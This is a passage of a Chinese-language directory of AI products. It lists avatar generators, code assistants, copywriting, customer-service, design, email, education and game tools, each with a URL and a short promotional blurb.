https://avatarai.me 创建您自己的 AI 生成头像。 Digirama 头像 https://apps.apple.com/us/app/character-creator-digirama/id6444673721 Digirama 是一款 AI 角色创建器，可作为移动应用程序使用。 Inworld 头像 https://www.inworld.ai 栩栩如生的 AI 角色，可以进行开放式对话。问他们任何事情。专为游戏、娱乐和虚拟世界打造。 HairstyleAI 头像 https://www.hairstyleai.com 使用我们强大的 AI 技术生成不同的发型。看看哪一个最适合你。适用于男性和女性理发。 In3D 头像 https://in3d.io/ 把人变成逼真的化身！使用手机摄像头在一分钟内为您的元宇宙、游戏或应用程序创建逼真且可自定义的头像。 Reface AI 头像 https://hey.reface.ai 一款用于在 GIF 和视频中换脸的 AI 应用程序。他们的 AI Avatar 功能允许创建高质量的艺术品般的肖像（适用于 iOS 和 Android）。上传10张照片，等待一个小时。获得 48 件独特的艺术作品，以您自己为主角，采用各种艺术风格——从超级英雄到赛博朋克。 Unrealme 头像 https://unrealme.io 获取 AI 生成的您的图像。 Lensa 头像 https://prisma-ai.com/lensa Lensa 是一款用于自拍和照片修饰的图片编辑器。该应用程序有许多图片过滤器，可以拍出甜美的自拍，去除任何模糊背景或进行任何其他必要的编辑。凭借其简单的功能和照片效果，您可以让每张照片一年 365 天都完美无缺。捕捉难忘的瞬间，并进行必要的照片编辑，及时定格每一刻。您不需要照相馆或暗室，因为几秒钟内您的桃色自拍就准备好了。 CodeSquire 代码助手 https://codesquire.ai 面向数据科学家、工程师和分析师的 AI 代码编写助手。在您键入时获取代码完成和建议。 Buildt 代码助手 https://www.buildt.ai 人工智能搜索通过搜索代码的作用来查找代码，而不仅仅是它是什么。一旦你找到代码库的一部分，他们的 AI 就可以让你简单地通过描述你想要的东西来进行更改 Hey, GitHub! 代码助手 https://githubnext.com/projects/hey-github 此工具可帮助您在不接触键盘的情况下编写代码。它通过与 GitHub copilot 交谈，使用您的声音进行编码，而无需打字。 WhatTheDiff 代码助手 https://whatthediff.ai 您的人工智能代码审查助手。通过自动化拉取请求摘要来节省昂贵的开发人员时间。打开拉取请求并在几秒钟内获得更改摘要。立即了解小型拉取请求的含义，并在大型拉取请求上抢占先机。 Maverick 代码助手 https://www.trymaverick.com Maverick 是一种由 AI 提供支持的代码完成工具。Maverick 建于 Yurts，专注于在不接触任何 API 或知识库的情况下在本地机器上提供最佳代码完成。 Continual 代码助手 https://continual.ai/ 现代数据堆栈的操作 AI。Continual 是现代数据堆栈的领先运营 AI 平台。无需复杂的工程，即可构建永不停止改进的预测模型。免费试用。 Lookup 代码助手 https://app.uselookup.com 在几秒钟内从您的数据中获得答案。Lookup 是 AI 驱动的分析平台，可帮助您以 10 倍的速度从数据获得洞察力。导入您的数据，提出问题，立即获得结果。 Clippy AI 代码助手 https://marketplace.visualstudio.com/items?itemName=clippy-ai Clippy AI（VS 代码扩展）是 OpenAI Codex 的简单包装器。它允许您向 Codex 发送您的当前文件以及一些纯文本英语说明。然后它会在您的编辑器中打开一个差异视图，以便您可以轻松查看建议的更改并接受或拒绝它们。 Mutable 代码助手 https://mutable.ai 使用 AI 以生产质量快速构建。 Fig AI 代码助手 https://fig.io/user-manual/ai 作为现有终端的无缝附加组件，Fig 集成了最流行的终端、shell 和 IDE。 BlackBox AI 代码助手 https://www.useblackbox.io/ BlackBox AI 是一款由 AI 驱动的编码助手，因此您的编码速度可以提高 10 倍。它使您能够将任何问题转化为代码和功能，例如从任何视频和代码自动完成中提取代码。 CodeAssist 代码助手 https://plugins.jetbrains.com/plugin/20085-codeassist CodeAssist（适用于 Intellij）是用于编程的 AI 助手/聊天机器人/副驾驶。根据您要进行的更改的描述，它会生成或更改代码。安装后，您可以通过单击左下角的“CodeAssist”选项卡打开它。CodeAssist 适用于所有流行的编程语言。 Programminghelper 代码助手 https://www.programming-helper.com/ 在 AI 的帮助下更快地编写代码。只需键入文本描述即可生成代码。AI 将为您创建代码。现在测试一下。 Copilot 代码助手 https://github.com/features/copilot 您的 AI 结对程序员。GitHub Copilot 使用 OpenAI Codex 直接从您的编辑器实时建议代码和整个功能。 AskCodi 代码助手 https://www.askcodi.com 编写语法、注释和测试。快点。更轻松。更好的。AskCodi 牢记开发人员的需求以避免冗余任务，因此减少了开发时间，增加了执行时间。 Amazon CodeWhisperer 代码助手 https://aws.amazon.com/codewhisperer/ Amazon CodeWhisperer 是一项由机器学习 (ML) 提供支持的服务，可根据开发人员在集成开发环境 (IDE) 中以自然语言和代码发表的评论生成代码建议，从而帮助提高开发人员的工作效率。 Cheat Layer 代码助手 https://cheatlayer.com/ 无代码业务自动化。作弊层使用无代码工具和机器学习的组合来解决不可能的业务自动化问题，以充当您的个人软件工程师。 AI CLI 代码助手 https://github.com/abhagsain 开源 GPT -3 Powered CLI 当前提示长度为 ~840 个令牌，1K 令牌的 text-davinci-002 定价为 0.02 美元，即 ~0.017 美元/命令。我们将看看是否可以通过微调改善响应并降低每条命令的成本。 CodeGeeX 代码助手 https://huggingface.co/spaces/THUDM/CodeGeeX CodeGeeX 是一个拥有 130 亿参数的大规模多语言代码生成模型，在超过 20 种编程语言的大型代码语料库上进行预训练。CodeGeeX 支持 15 种以上的代码生成和翻译编程语言 Maverick 代码助手 https://marketplace.visualstudio.com/items?itemName=YurtsAI.maverick&amp; Maverick 是一种由 AI 提供支持的代码完成工具。Maverick 建于 Yurts，专注于在不接触任何 API 或知识库的情况下在本地机器上提供最佳代码完成。 Tabnine 代码助手 https://www.tabnine.com 无论您是团队的一员，还是独立工作的开发人员，Tabnine 都将帮助您更快地编写代码——一切都在您最喜欢的 IDE 中进行。 Spellbox 代码助手 https://spellbox.app/ 忙碌程序员的AI编码助手。使用 AI 在几秒钟内解决任何编程或工程问题 Stenography 代码助手 https://stenography.dev/ 最后。自动文档。 Replit 代码助手 https://replit.com Replit 最近添加了一项名为 Ghostwriter 的功能，该功能使用 AI 来完成代码。使用功能强大的 IDE、编译器和解释器 Replit，在浏览器中以 50 多种语言编写和运行代码。 Codeium 代码助手 https://www.codeium.com/ Codeium 是现代编码超级大国，是一种基于尖端 AI 技术构建的代码加速工具包。通过轻松集成到编辑器中，您可以专注于成为最好的软件开发人员，而不是最好的代码猴子。 Hypotenuse ai 文案 https://hypotenuse.ai/ 使用 AI 文案写作将几个关键词变成原创的、有洞察力的文章、产品描述和社交媒体文案——这一切只需几分钟。今天免费试用。 Bertha.ai 文案 https://bertha.ai 最有价值的 AI 文案助理 - 事实！永久免费获得 5,000 个单词。Bertha AI - WordPress 及其他软件的文案助理。 Digital First AI 文案 https://digitalfirst.ai 使用 AI 在几秒钟内制定营销计划。借助 AI 为您的企业找到最佳的增长黑客策略。将营销切换到自动驾驶模式并实现增长。 Botowski 文案 https://www.botowski.com/ Botowski 是您的新个人 AI 撰稿人。 VEG3 文案 https://veg3.ai 加入世界上第一个纯素人工智能营销助理的 Beta 测试。 Daydrm.ai 文案 https://www.daydrm.ai 用于创意广告创意的 AI 工具。创意和机构的按需概念。一种针对人工编写的创意广告活动进行训练的大型语言模型。 https://unbounce.com 文案 https://jasper.ai 借助人工智能，创建内容的速度提高 10 倍。Jasper 是质量最高的 AI 文案写作工具，拥有超过 3,000 条 5 星评论。最适合撰写博客文章、社交媒体内容和营销文案。 Peppertype.ai 文案 https://www.peppertype.ai 您的虚拟内容助手，可帮助您在几秒钟内生成高质量的内容。 unbounce 文案 https://unbounce.com 构思、迭代和编写定制的、高质量的、引人入胜的专业文案。在 Web 应用程序、便捷的桌面应用程序和 Chrome 扩展程序之间，将 Smart Copy 带到您最喜欢的工具中。 Easy-Peasy.AI 文案 https://easy-peasy.ai/ 使用 🤖 AI 工具更快更轻松地完成文案写作。您还可以使用我们的 AI 头像生成器来生成头像。Easy-Peasy.AI 相信每个人都有一个故事要讲。借助我们的 AI 文案写作工具，我们可以帮助您以最引人入胜的方式讲述您的故事。 Simplified 文案 https://simplified.com/ai-writer Simplified AI Writer 是一款免费的人工智能文案写作助手，可为博客、文章、产品描述、网站和社交媒体生成高质量的内容。 CopyMonkey 文案 https://copymonkey.ai/ CopyMonkey 在几秒钟内生成并优化亚马逊列表。AI 帮助将所有重要的关键词放在您的亚马逊列表中，让您在首页上自然排名。 Anyword 文案 https://anyword.com Anyword 的 AI 写作助手可为任何人生成有效的文案。使用可转换的 AI 文案工具，消除营销文本中的猜测。 Lek 文案 https://lek.ai/ Lek 是一个 AI 文案工具。这是创建内容和复制的最快、最简单的方法。Lek AI 帮你写任何东西。 Copysmith 文案 https://copysmith.ai/ 为电子商务团队和机构选择的人工智能文案软件。产生比以往更多的收入。立即注册免费试用。 Copy.ai 文案 www.copy.ai 获得畅销的副本。Copy.AI 是一款人工智能文案，可为您的企业生成高质量的文案。免费开始，无需信用卡！营销更简单！ Cowriter 文案 https://cowriter.org/ 厌倦了盯着空白屏幕？认识您的 AI 撰稿人，他们可以创作鼓舞人心的创意内容。 Contents 文案 https://contents.com 加强您的内容策略。生成式 AI 平台使内容创建变得简单，并且专为性能而构建。 Creator AI 文案 https://www.creaitor.ai/ Creaitor 帮助您以更强大、更能表达情感的方式编写内容。 Adcreative.ai 文案 https://adcreative.ai 在几秒钟内生成以转化为重点的广告和社交媒体帖子创意。在节省时间的同时获得更好的结果。 WiziShop 文案 https://wizishop.com/ai 使用 WiziShop 的人工智能编写您的电子商务产品描述，为您未来的文章寻找灵感，轻松走向国际，并为您的商店带来更多流量！ Rytr 文案 https://rytr.me/ Rytr 是一款 AI 写作助手，可帮助您在短短几秒钟内以极低的成本创建高质量的内容！ Unbound 文案 https://www.unboundcontent.ai 为您的小型企业自动创建内容。在一个地方利用所有最好的 AI 生成工具，旨在为小型企业、在线商店和创作者自动创建内容。 texti 文案 https://texti.app 存在于您的浏览器中的 AI！它将与您合作，提升您的内容质量！ Ocoya 文案 https://www.ocoya.net 一个可以更快地创建、自动生成和安排内容的平台。内容营销、文案写作和社交媒体只需几分钟！ BotDistrikt 顾客服务 https://www.botdistrikt.com BotDistrikt 是适合您业务的完整聊天机器人解决方案。 Poly ai 顾客服务 https://poly.ai/ 超人语音助手。24/7 全天候立即接听每个电话。无需代理。 Kore.ai 顾客服务 https://kore.ai/ 推动 AI 优化的客户和员工体验。我们是对话式 AI 技术的全球领导者，帮助公司在语音和数字渠道上为其客户、代理和员工提供非凡的体验。 viable 顾客服务 https://www.askviable.com/ 在不影响质量的情况下自动执行定性数据分析。 Vee 顾客服务 https://vee.ai/en/ 人们喜欢与之交谈的聪明顾问。Vee 已经与 500 万波兰人进行了交谈，有效地为来自不同行业的数十家公司实施了业务流程。 Quickchat 顾客服务 https://www.quickchat.ai Quickchat 使销售、客户支持、入职或在线预订等流程自动化。 Forethought 顾客服务 https://forethought.ai/ Forethought 的 AI 平台自动化并优化了整个支持工单生命周期。降低支持成本，同时在每次客户交互中提供顶级服务。 Typewise 顾客服务 https://typewise.app 提高客户服务和销售效率。我们强大的 AI 解决方案可为用户和公司节省时间并改善沟通。立即预订演示！ Ebi.Ai 顾客服务 https://ebi.ai 通过 AI 助手减少通话量并改善客户体验。 Harvey 顾客服务 https://hiverhq.com/harvey-ai-customer-support 提高团队生产力的 AI Sidekick Cohere 顾客服务 https://cohere.io/ 零设置即可查看和控制用户的屏幕。以前所未有的速度解决问题，保护和增加收入，让客户爱上您的产品 Maya 顾客服务 https://maya.ai 每个人都因 AI 驱动的个性化而获益：客户、银行和商家。 Tiledesk 顾客服务 https://tiledesk.com/ 将免费实时聊天与开源聊天机器人相结合以提高投资回报率。将 Chatbots 与 WhatsApp 或其他渠道集成，为所有通信提供一个收件箱。 Xokind 顾客服务 https://www.xokind.com/ 用于客户支持、差旅和销售的强大 AI 代理。XOKind 为产品和数据团队提供人工智能平台，通过简单的 API 端点利用机器学习和大型人工智能模型。 Delve 顾客服务 https://www.delve.ai/ 为您的企业和您的竞争对手企业自动创建角色 Kaizan 顾客服务 https://kaizan.ai/ Kaizan 是客户成功团队保持和增加收入的客户智能平台 echowin 顾客服务 https://echo.win/ 使用 AI 自动来电。获取新电话号码或使用现有电话号码。您的客户将致电我们的人工智能系统，该系统将帮助他们获得所需的答案、执行业务任务或在需要时将他们联系到合适的人。在我们处理电话的同时，您可以专注于经营您的业务！ Puzzle 顾客服务 https://www.puzzlelabs.ai/ 为您的社区和客户提供的 AI 支持的词汇表。使用功能强大的词汇表让您的产品、服务和社区更加清晰。 Magician (Figma) 设计助手 https://magician.design/ 由 AI 提供支持的 Figma 神奇设计工具。Magician 是一个 Figma 插件，可让您利用 AI 的力量进行设计，以完成从文案撰写到从文本生成独特图标的所有工作。每个魔法咒语都与您一起工作，以在您设计时扩展您的创造力和想象力。 Uizard 设计助手 https://uizard.io/ 使用世界上第一个人工智能驱动的设计工具 Uizard，在几分钟内设计数字产品、移动应用程序、网站模型和线框图！立即注册。 Clickable 设计助手 https://www.clickable.so 适用于所有营销渠道的精美、品牌一致且转化率高的广告。无需设计经验。 Diagram 设计助手 https://diagram.com 设计更智能。神奇的产品设计新方法。 Microsoft Designer 设计助手 https://designer.microsoft.com 使用 Microsoft Designer 瞬间完成令人惊叹的设计。从简单的文字描述开始，然后为您的设计创建图像！ Designs AI 设计助手 https://designs.ai/ 在 2 分钟内使用 AI 创建徽标、视频、横幅和模型。 Pinegraph 设计助手 https://pinegraph.com/ 成为 Pinegraph 的艺术家。借助 Pinecasso AI 的强大功能，将您的想象力变为现实。只需描述您的需求，剩下的交给 Pinecasso 来做。 Pattern Maker AI 设计助手 https://patternmakerai.com/ 使用人工智能生成无缝矢量模式。您还可以浏览其他已公开的生成模式。 Illustroke 设计助手 https://illustroke.com/ 来自文本提示的令人惊叹的 SVG 插图使用我们的文本到 SVG AI 工具创建一些独特的东西。 Pictorial 设计助手 https://pictorial.ai/ 第一个真正对您的业务有用的生成式 AI 应用程序。为您网站的视觉效果而苦恼？让 AI 来处理。 Hotpot.ai 设计助手 https://hotpot.ai Hotpot 帮助您创建专业的图形和图片。人工智能工具让专家和消费者能够激发创造力并自动完成繁琐的工作。易于编辑的模板使任何人都可以创建设备模型、社交媒体帖子、营销图片、应用程序图标和其他工作图形。 Autodraw 设计助手 https://autodraw.com Autodraw 是一种 AI 工具，可让您通过猜测要绘制的对象或形状来更快地绘制。 Vizcom 设计助手 https://www.vizcom.ai/ 看到您的绘图在几秒钟内栩栩如生，而不是几小时。 Dimensions 设计助手 https://www.dimensions.ink 只需单击几下，Dimensions 可帮助您将粗略的草图、照片甚至纯文本变成高度详细的概念。专注于创造力，而不是没完没了的例行公事。 StockImg AI 设计助手 https://stockimg.ai/ 使用 AI 设计服务的文本。使用 AI 生成徽标、库存图像、海报、书籍封面和更多设计。 AI2image 设计助手 https://www.ai2image.com/ AI 在几秒钟内生成您的自定义图像。您可以通过简单的英文描述为您的网站、博客或社交媒体生成图像。 AIGraphics 设计助手 https://aigraphics.io/ 使用 AI 在几秒钟内创建精美的定制图形。您可以使用它来创建社交图像、youtube 缩略图、徽标创意、照片和插图。 CandyIcons 设计助手 https://www.candyicons.com/ 为您的产品寻找漂亮的应用程序图标。访问我们大量精美的应用程序图标并选择您最喜欢的图标。您将获得完整的版权所有权和支持 iOS、macOS 和 Android 项目的独特高质量图标。还有一个定制的图标生成器。 IllostrationAI 设计助手 https://www.illostration.com 创建 AI 生成的插图。在几秒钟内的唯一性。我们目前处于公开测试阶段。注册以获得早期访问权限。 Patterned AI 设计助手 http://patterned.ai/ 人工智能生成的无缝模式。使用我们的 AI 模型为您的产品或服务生成定制设计。您还可以搜索数以千计的免版税库存图片，以立即用于您自己的设计。 Designify 设计助手 https://www.designify.com/ 使用您喜欢的照片创建自动设计。通过自动删除背景、增强颜色、调整智能阴影等，选择任何图像来创建 AI 支持的设计。立即保存、下载或共享您的设计。 CSM 开发者工具 https://csm.ai/ Common Sense Machines 提供 API、接口和开源软件，将多模式输入和体验转化为用于 AI 训练和内容创建的数字模拟器。我们认为，学习生成世界模型是实现 AGI 的系统途径，类似于儿童从经验中了解其世界的方式。 RunPod 开发者工具 https://runpod.io 以 0.2 美元/小时的价格租用云 GPU。在 GPU 上节省超过 80%。借助用于 PyTorch、Tensorflow 或任何其他 AI 框架的 Jupyter，GPU 租赁变得轻松。 Moonbeam Exchange 开发者工具 https://moonbeam.ai Moonbeam Exchange 是一个数据科学平台，它利用 100 多个数据源为整个创新生态系统提供情报和洞察力。 Shumai (Meta) 开发者工具 https://github.com Shumai 是一个开源、快速、网络连接、可微分的 TypeScript（和 JavaScript）张量库。为软件工程师和研究人员等使用 bun + flashlight 构建。 SyntheticAIdata 开发者工具 https://syntheticaidata.com 加速您的视觉 AI 模型创建。合成数据是用于训练和改进 AI 模型的现实世界数据的廉价替代品。为了训练准确的人工智能模型，需要大量的数据。通过使用逼真的 3D 模型，您可以轻松创建用于 AI 分类和对象检测的合成数据。 Chatbotkit 开发者工具 https://chatbotkit.com 构建高级 AI 聊天机器人的最简单方法。我们的平台使开发人员和非开发人员都可以轻松构建可以用自然语言与用户交流的聊天机器人。 Pipeline AI 开发者工具 https://pipeline.ai 用于 ML 模型的无服务器 GPU 推理 用于在生产中运行 ML 的每毫秒付费 API。 Nuclia 开发者工具 https://nuclia.com Nuclia 自动为来自任何内部和外部来源的非结构化数据编制索引，提供优化的搜索结果。它可以处理视频和音频转录、图像内容提取和文档解析。 Tinq.ai - NLP API 开发者工具 https://tinq.ai 一组易于使用和尖端的 NLP API。流行的 API：文本生成 - 重写器/释义器摘要器将快速而强大的文本分析集成到您的应用程序中。从主题分类到情绪分析和实体提取，我们都能满足您的需求。让它在几天内发生，而不是几个月！文本分析：Plagarism Checker；自定义分类器；情绪分析；命名实体识别 Valyr 开发者工具 https://valyr.vercel.app 用一行代码简化 GPT-3 监控。要使用，请将基本 url 替换为 SDK。将您的 OpenAI 密钥添加到 Valyr 并在仪表板中查看请求。 GPUX.AI 开发者工具 https://gpux.ai GPU 一切。运行任何 Dockerized。运行自动缩放推理。节省成本50-90%。 RTutor 开发者工具 https://tutor.ai RTutor 是一款基于 AI 的应用程序，可以快速生成和测试 R 代码。在对 OpenAI 的 Davinci（ChatGPT 的兄弟）的 API 调用的支持下，RTutor 将自然语言翻译成 R 脚本，然后在 Shiny 平台内执行。可以生成 R Markdown 源文件和 HTML 报告。在此处查看 github 存储库：https://github.com/gexijin/RTutor Mintlify 开发者工具 https://mintlify.com 构建您一直想要的文档。开箱即用，易于维护，并针对用户参与进行了优化。 GptDuck 开发者工具 https://gptduck.com 针对任何 Github 存储库的问题回答。输入 Github 存储库，我们将其下载到服务器并针对代码创建嵌入。回购需要是公开的，&lt;200 个文件，&lt;100MB。 Textomap 开发者工具 https://textomap.com Textomap 是一个 Web 应用程序和浏览器扩展，使用户能够在几秒钟内从任何包含位置的文本生成交互式地图。没有代码、电子表格或复杂的工具——您的话就足够了。 HTTPie AI 开发者工具 https://httpie.io 使用通俗易懂的语言生成 API 请求。HTTPie 正在使 API 对于那些构建我们这个时代的工具的人来说变得简单和直观。 Quizgecko 教育助手 https://quizgecko.com 人工智能驱动的测验问题生成器。使用人工智能制作您自己的测验。非常适合教师、电子学习和人力资源专业人士。或者只是为了好玩而生成独特的琐事问题和答案！简单粘贴文本，输入 URL，或上传文件并点击生成。从多项选择题、简答题或判断题中选择。 WolframAlpha 教育助手 https://wolframalpha.com 使用 Wolfram 的突破性算法、知识库和 AI 技术计算专家级答案。面向数学、科学与技术、社会与文化以及日常生活等主题。 TutorAI 教育助手 https://tutorai.me Tutor AI 是一个人工智能驱动的学习平台。您可以输入任何主题，它会为您提供各种选项，您可以使用这些选项来了解该主题。 MindSmith 教育助手 https://mindsmith.ai Mindsmith 是您创建和分享微课程的实验室。世界变化太快，不能依赖笨重、过时的设计软件。无论您是培训团队、教授课程，还是只是需要一种清晰的方式来分享您的知识，都可以使用一套 AI 辅助的直观设计工具，让您的学习者在永不停歇的行业和学科中取得成功。 Yip 教育助手 https://yippity.io 输入您的笔记，Yip 会自动从中生成问题。 MateAI 邮件助手 https://mateai.io 更快地为您的电子邮件活动生成文案和设计。🇬🇧 🇮🇹 提供英语、意大利语和其他 5 种语言版本。 Ellie 邮件助手 https://ellieai.com Ellie 从您的写作风格中学习，并像您写的一样精心回复。 Ipso AI 邮件助手 https://ipso.ai 一个 AI 助手，它使用您的日历起草用于安排会议的电子邮件回复，由 GPT3 提供支持。 Luna 邮件助手 https://getluna.dev 使用 Luna 即时个性化冷电子邮件。这些天自动消息已经死了。使用 Luna 获得更多关于冷电子邮件的回复 - 世界上第一个使用 AI 每天推荐新的高质量潜在客户并向他们发送他们应得的个人电子邮件的软件应用程序。 PolitePost 邮件助手 https://politepost.net PolitePost 将您的电子邮件重写为礼貌、礼貌和安全的工作方式。非常适合当您在写电子邮件时感到沮丧并且需要 AI 来保持礼貌！ Pipl.ai 邮件助手 https://pipl.ai 很难大规模发送冷电子邮件。我们让它变得轻而易举。连接无限的收件箱，享受所有帐户的免费预热、内置电子邮件验证和数据清理、人工智能驱动的序列和模板编写器等等...... Postaga 邮件助手 https://postaga.com 比以往更轻松地发送冷电子邮件。 DraftLab 邮件助手 https://draftlab.ai 您的 Gmail 副驾驶。更快地写出更好的电子邮件。使用适用于 Gmail 的 DraftLab Chrome 扩展，将收件箱归零的速度提高 10 倍。 SuperReply 邮件助手 https://superreply.co Superreply 使用其 AI 驱动的电子邮件回复工具处理编写电子邮件回复的所有艰苦工作。轻松匹配语调并选择最匹配的电子邮件。 Quicklines 邮件助手 https://quicklines.ai Quicklines 自动创建个性化的破冰机制以注入冷电子邮件。上传 CSV，等待 3 分钟，然后收到写有行的表格。将这些行放入冷电子邮件的第一句中，您会看到您的回复增加了 3 到 7 倍。 Instantly 邮件助手 https://instantly.ai 立即帮助您产生更多回复和更多收入。通过无限制的电子邮件发送帐户、无限制的预热和智能 AI 扩展您的外展活动。 Creatext 邮件助手 https://creatext.ai Creaext 可帮助您立即研究您的潜在客户并编写超个性化的电子邮件和 LinkedIn 消息。 ChatGPT Writer 邮件助手 https://chatgptwriter.ai 免费的 Chrome 扩展，使用 ChatGPT AI 根据您输入的几个关键字生成电子邮件或回复。目前支持 Gmail。支持所有流行语言，只需在文本提示中提及即可。 Ortto 邮件助手 https://ortto.com Ortto AI 可帮助您编写高性能的电子邮件主题行，从大纲中引人入胜的短信和电子邮件内容。驱动结果的是智慧。 Warmer.ai 邮件助手 https://warmer.ai Sky 使用 AI 生成的独特个性化设置让您的冷邮件大放异彩。 Robin 邮件助手 https://hellorobin.ai 由 GPT 编写的自动冷电子邮件外展。借助 Robin AI，您可以轻松有效地接触潜在客户、进行研究并处理初始外展——所有这些都不需要人工销售助理。 Magicreach 邮件助手 https://magicreach.ai Reach 是一种外展个性化和销售支持工具，可为冷外展生成超个性化破冰船。获得回复的更快的电子邮件个性化。 Alethea 实验 https://alethea.ai Alethea AI 致力于实现交互式智能 NFT (iNFT) 的创建。 Ask My Book 实验 https://askmybook.com Ask My Book 是 Gumroad 创始人 Sahil Lavingia 的一项人工智能实验，目的是让他的书更容易阅读。您可以使用“问我的书”来提出问题，然后用他的声音得到答案。 Talk To Books 实验 https://books.google.com 一种探索思想和发现书籍的新方法。使用实验性 AI 发表声明或提出问题以浏览书中的段落。 VisualHound 时尚 https://visualhound.com 使用 AI 为您的时装设计创意制作原型。创建无限逼真的产品图像来满足您的情绪板并促进您的设计过程。在投入生产之前轻松可视化您的产品设计。 FashionAdvisorAI 时尚 https://fashionadvisorai.com 从 FashionAdvisorAI 提问并获得答案。它使用人工智能来帮助您找到时尚问题的答案。用它来打扮自己。 Cala 时尚 https://ca.la CALA 使您可以轻松设计、生产和交付您自己的完全定制的时尚产品。CALA 提供您可能需要的一切。设计协助。材料采购。采样。借助应用程序内通知、任务管理和实时评论等强大功能，您可以在工作室或旅途中最大限度地提高工作效率。 Botika 时尚 https://botika.io Botika 利用生成式 AI 的力量帮助在线服装零售商和小型企业减少制作时尚照片的麻烦、成本和时间，同时在各种模型上获得 10 倍以上的输出。 AskThee 趣味工具 https://askthee.vercel.app 向伟大的思想家、艺术家或科学家提问。目前拥有亚里士多德、阿西莫夫、卡尔萨根等人物。 Unreal Meal 趣味工具 https://unrealmeal.ai AI 生成的不存在的膳食图像的集合。您可以将这些图像用于多种用途，例如开发新食谱或作为创意项目的一部分。 Tattoos AI 趣味工具 https://tattoosai.com 与您的个人 AI 纹身艺术家一起创造完美的纹身设计如果您有纹身的想法但找不到合适的设计，让我们的 AI 在几秒钟内生成一个。它可以让您根据自己的喜好创建完美的设计，并为您提供无限的选择，让每个人都能找到适合自己的东西。 ELI5 趣味工具 https://explainlikeimfive.io 像我五岁一样解释 (ELI5) 是一个使用 AI 简化复杂主题的网站，这样即使是孩子也能理解它们。用户可以选择一个特定的主题，并选择他们希望解释的简单程度，范围从“非常愚蠢”到“非常聪明”。一些例子是——“计算机是如何工作的？” 和“生命的意义是什么？” MovieToEmoji 趣味工具 https://movietoemoji.netlify.app 一个有趣的应用程序，可以将电影名称转换为相应的表情符号！ Santa AI 趣味工具 https://santa.artflow.ai 想为假期增添一些额外的魔力吗？查看世界上第一个可定制的会说话的圣诞老人 - 第一次您可以创建自己独特的圣诞老人视频问候并与您所爱的人分享！ Supermeme.ai 趣味工具 https://supermeme.ai 生成由 AI 提供支持的 110 多种语言的原创模因。使用我们的 AI 模因生成器加强您的模因营销游戏。 Jokelub 趣味工具 https://jokelub.com 轻轻一按，将您的文章变成一个笑话。让人们微笑。 Hello History 趣味工具 https://hellohistory.ai 您将能够与历史上一些有影响力和迷人的人物进行深入对话。对话是由人工智能生成的，所以不要太当真。每个对话都是独一无二的，你永远不知道它会去哪里。 AskNow 趣味工具 https://asknow.ai 向名人提出任何问题，并获得带有参考资料的 AI 总结答案。以 Elon Musk、Naval Ravikant、Paul Graham、Serena Williams 等人物为特色。 Chai 游戏 https://chai.ml 允许您为成千上万的用户构建和部署 AI 聊天机器人的移动应用程序。与人工智能聊天。 AIDungeon 游戏 https://play.aidungeon.io 玩和创造具有无限可能性的 AI 生成的冒险。 AI Careers 游戏 https://aicareers.io 人工智能求职变得简单。释放数据的潜力以推动创新。 PICLY : AI generated spot the difference 游戏 https://picly.ai 简单易行。AI 生成的“找不同”点击您想要的区域，AI 会为您完成。 EndlessVN 游戏 https://endlessvn.io 所有的故事都结束了。除了这个。Endless Visual Novel 是一款 AI 讲故事游戏，其中所有资产（图形、音乐、故事和角色）均由 AI 在您玩游戏时生成。没有两个游戏是完全相同的。 The Simulation 游戏 https://fablesimulation.com The Simulation 是一个以人工智能为中心的元宇宙。由复杂的机器学习、游戏设计、NFT 和 ERC20 代币 $SIM 提供支持 Playstrict 游戏 https://playstrict.com 让我们让您的游戏更加成功！您有一款很棒的游戏，但没有营销能力来扩大规模？使用 Playstrict Gaming Growth 平台将您的推广策略提升到一个新的水平。你准备好了吗？ LitRPG Adventures 游戏 https://litrpgadventures.com 高级桌面 RPG 生成器 + 内容库 D&amp;D 背景故事生成器？那不是全部。立即访问由 OpenAI 的 GPT-3 提供支持的超过 2 打奇幻 RPG 生成器。会员还可以访问我们不断增长的充满桌面角色扮演游戏内容的角色扮演游戏库 Hexagram 游戏 https://hexagram.io 我们使用人工智能创造环境体验。使用聊天、故事和数据来融合小说和现实的游戏。 GGPredict 游戏 https://ggpredict.io 每天不到 30 分钟，借助 AI 生成的培训的力量提高您的 CS:GO 技能。训练更智能。排名更快。 AI Roguelite 游戏 https://store.steampowered.com 世界上第一款所有实体均由 AI 生成且所有游戏机制均由 AI 检测的角色扮演游戏。它有人工智能生成的实体、制作配方、战斗和插图。 Quasi 综合写作 https://quasi.market 使用人工智能创造艺术、代码、音乐等。 Writewithlaika 综合写作 https://writewithlaika.com 作家的神奇机器学习 SmartScribe 综合写作 https://smartscribe.app 写作变得更容易... SmartScribe 通过使用人工智能帮助解决阅读和写作的复杂性。 nichess 综合写作 https://nichesss.com 忘记作家块。只需单击一个按钮，即可获取博客文章、广告、社交媒体内容、诗歌、商业创意等。我们的机器人会为您编写一切。 Compose 综合写作 https://compose.ai Compose 是一款免费的 Chrome 扩展程序，可让您使用 AI 自动进行写作。我们不应该每天花 40% 的时间打字：是时候改变游戏规则了。 Text Generator Plugin 综合写作 https://text-gen.com Text Generator 是一种开源 AI 助手工具，它将生成式人工智能的力量带入了 Obsidian 中知识创造和组织的力量。例如，使用文本生成器根据您的知识数据库生成想法、有吸引力的标题、摘要、大纲和整个段落。可能性是无止境！ WebCopilot 综合写作 https://webcopilot.co 用 AI 编写您的概念页面。只需开始，让 AI 为您写作。加快您的写作过程并专注于重要的事情。 Frase 综合写作 https://frase.io Frase 在文案写作、总结、释义和广告等类别中提供了多种有用的 AI 写作工具。 Notion AI 综合写作 https://affiliate.notion.so 在任何概念页面中利用 AI 的无限力量。写得更快，想得更远，并增强创造力。像魔法一样！ LanguageTool 综合写作 https://languagetool.org LanguageTool 纠正拼写错误，但它也提供所有可能文本的完整写作分析。除了拼写、语法和单词选择之外，语言风格也会得到纠正。掌握30多种语言和方言，主要语言有英语、西班牙语、德语、法语、荷兰语、葡萄牙语。在其英文版中，您可以在六个标准品种之间进行选择。除了纠正之外，LanguageTool 还提供基于 AI 的改写功能。这可以帮助您重写整个句子，使它们更简单、更短或更正式。 AIDuh 综合写作 https://aiduh.com Chrome 扩展程序通过 AI 支持的响应将您的写作时间缩短 98%。 Writely 综合写作 https://writelyai.com 让所有人都能接触到写作艺术。无论您是需要减少字数、进一步阐述还是简单地改写一个句子，Writely 都可以提供帮助！ Grammarly 综合写作 https://app.grammarly.com 使用 Grammarly 的新人工智能应用程序自信地写作。通过自动建议超越语法和拼写风格和语气。适用于电子邮件、文档、社交媒体和几乎所有内容。 Proposal Genie 综合写作 https://proposalgenie.ai 人工智能驱动的工具，可帮助在 Upwork 